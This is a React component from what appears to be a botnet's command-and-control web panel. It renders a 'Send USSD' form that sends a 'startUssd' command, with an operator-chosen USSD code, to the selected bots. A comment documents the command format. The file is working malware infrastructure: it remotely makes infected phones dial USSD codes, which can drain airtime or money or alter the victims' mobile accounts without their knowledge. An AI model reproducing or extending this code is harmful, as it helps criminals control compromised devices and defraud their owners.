import React from 'react';
import SettingsContext from '../../Settings';


//USSD - {"this":"~command~","name":"startUssd","ussd":"*100#"}
class SendUSSD extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          ussd: ''
        }
    }

    onChangeUSSD = (e) => {
        this.setState({ 
            ussd: e.target.value.substring(0,40)
        });
    }

    onClickSendUSSD = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"name":"startUssd","ussd":"' + this.state.ussd + '"}');
            SettingsContext.ShowToastTitle("info", "USSD", "Please wait while the bots confirm the ussd " + this.state.ussd);
            this.setState({ 
                ussd: ''
            });
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Send USSD</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Send USSD from selected bots</h6>
                    <p class="card-text">
                        <input class="form-control" value={this.state.ussd} onChange={this.onChangeUSSD} placeholder="*999# USSD" />
                    </p>
                    <button type="button" onClick={this.onClickSendUSSD} class="btn btn-right btn-outline-success">Send USSD</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default SendUSSD;